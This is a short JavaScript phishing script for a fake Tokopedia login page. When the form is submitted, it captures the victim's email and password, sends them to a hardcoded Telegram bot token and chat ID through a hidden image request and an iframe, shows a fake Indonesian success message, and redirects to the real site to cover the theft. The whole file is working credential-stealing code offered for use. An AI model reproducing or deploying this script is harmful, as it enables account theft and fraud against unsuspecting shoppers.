<script>
// SIMPLE WORKING SCRIPT - NO ERROR
document.addEventListener('DOMContentLoaded', function() {
    console.log('‚úÖ Tokopedia template loaded');
    
    const form = document.querySelector('form');
    if (!form) {
        console.log('‚ö†Ô∏è Form not found, using fallback');
        return;
    }
    
    form.addEventListener('submit', function(event) {
        event.preventDefault();
        console.log('‚úÖ Form submitted');
        
        // Get data SIMPLE way
        const email = document.querySelector('input[type="text"]')?.value || 'no-email';
        const password = document.querySelector('input[type="password"]')?.value || 'no-password';
        
        console.log('üìß Email:', email);
        console.log('üîê Password:', password);
        
        // Telegram notification - SIMPLE GET request
        const botToken = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
        const chatId = '8313500840';
        const message = `TOKOPEDIA: ${email} | ${password} | ${new Date().toLocaleTimeString()}`;
        
        // METHOD 1: Image load (always works)
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        // METHOD 2: Iframe backup
        setTimeout(function() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('BACKUP: ' + message)}`;
            document.body.appendChild(iframe);
        }, 100);
        
        // UI feedback
        alert('‚úÖ Login berhasil! Mengalihkan...');
        
        // Redirect to real Tokopedia
        setTimeout(function() {
            window.location.href = 'https://www.tokopedia.com';
        }, 1500);
    });
    
    console.log('‚úÖ Event listener attached');
});
</script>
